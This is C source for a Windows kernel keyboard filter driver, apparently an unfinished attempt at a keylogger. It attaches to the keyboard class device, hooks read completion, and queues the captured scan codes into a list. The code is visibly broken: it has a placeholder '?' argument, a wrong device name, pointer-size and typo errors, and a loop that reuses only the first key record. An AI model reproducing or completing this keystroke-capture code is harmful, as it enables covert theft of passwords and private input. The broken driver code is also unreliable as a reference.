#include "common.h"
#include "KHook.h"

NTSTATUS HookKeyboardDevice(PDRIVER_OBJECT pDriverObject)
//创建设备，attach设备,初始化链表和互斥量
{
	WCHAR wDeviceName[] = L"\\Devices\\KdbClass0";
	UNICODE_STRING uDeviceName;
	PDEVICE_EXTIONSION pKeyboardDeviceExtension=NULL ;
	PDEVICE_OBJECT pHookDevice = NULL;
	NTSTATUS Status;
	
	do{
		RtlInitUnicodeString(&uDeviceName, wDeviceName);
		Status = IoCreateDevice(pDriverObject, sizeof(DEVICE_EXTENSION), NULL, FILE_DEVICE_KEYBOARD, ?, false, pHookDevice);
		if (!NT_SUCCESS(Status)){
			break;
		}
		pKeyboardDeviceExtension = (PDEVICE_EXTIONSION)pHookDevice->DeviceExtension;
		Status = IoAttachDevice(pHookDevice, &uDeviceName, pKeyboardDeviceExtension->pKeyboarDevice);
		if (!NT_SUCCESS(Status))
		{
			break;
		}
		//???
		pKeyboardDeviceExtension->pKeyboarDevice->Flags &= ~DO_DEVICE_INITIALIZING;
		pKeyboardDeviceExtension->pKeyboarDevice->Flags |= (DO_BUFFERED_IO|DO_POWER_PAGABLE);
		KeInitializeSemaphore(&pKeyboardDeviceExtension->sem, 0, MAXLONG);
		InitializeListHead(&pKeyboardDeviceExtension->MessageList);
		KeInitializeSpinLock(&pKeyboardDeviceExtension->pkLock);
		

	}while(false);
	if (!NT_SUCCESS(Status))
	{
		if (pHookDevice!=NULL)
			IoDeleteDevice(pHookDevice);
	}
	return Status;
}
NTSTATUS HookDevicePassThrough(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)
{
	IoSkipCurrentIrpStackLocation(pIrp);
	//这里原来是调用的DeviceExtension里的pKeyboardDevice
	return IofCallDriver(pDeviceObject->NextDevice, pIrp);
}
NTSTATUS  HookDeviceRead(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)
{
	PDEVICE_EXTIONSION pKeyboardDeviceExtension = (PDEVICE_EXTIONSION)pDeviceObject->DeviceExtension;
	IoSetCompletionRoutine(pIrp, HookDeviceReadComplete, pKeyboardDeviceExtension, true, false, false);
	IoCopyCurrentIrpStackLocationToNext(pIrp);
	return IoCallDriver(pDeviceObject->NextDevice, pIrp);
}
NTSTATUS HookDeviceReadComplete(PDEVICE_OBJECT pDeviceObject, PIRP pIrp, PVOID Context)
{
	PDEVICE_EXTIONSION pKeyboardDeviceExtension = (PDEVICE_EXTIONSION)pDeviceObject->DeviceExtension;
	PKEYBOARD_INPUT_DATA pKeyData = (PKEYBOARD_INPUT_DATA)pIrp->AssociatedIrp.SystemBuffer;
	int KeyCount = PIRP->IoStatus.Information / sizeof(PKEYBOARD_INPUT_DATA);
	int i;
	KEY_DATA *kData = ExAllocatePool(NonPagedPool, sizeof(KEY_DATA)*KeyCount);

	if (pKeyData->Flags==KEY_MAKE)
	{
		DbgPrint("Key Down");
		for (i=0; i<KeyCount; i++)
		{
			kData[i].KeyData = pKeyData->MakeCode;
			kData[i].KeyFlags = pKeyData->Flags;
			ExInterlockedInsertTailList((PLIST_ENTRY)&kData[i],&pKeyboardDeviceExtension->MessageList,&pKeyboardDeviceExtension->pkLock);
			KeReleaseSemaphore(&pKeyboardDeviceExtension->sem,0,1, false);
			g_PendingWrite++;
		}
	}
	return pIrp->IoStatus.Status;
}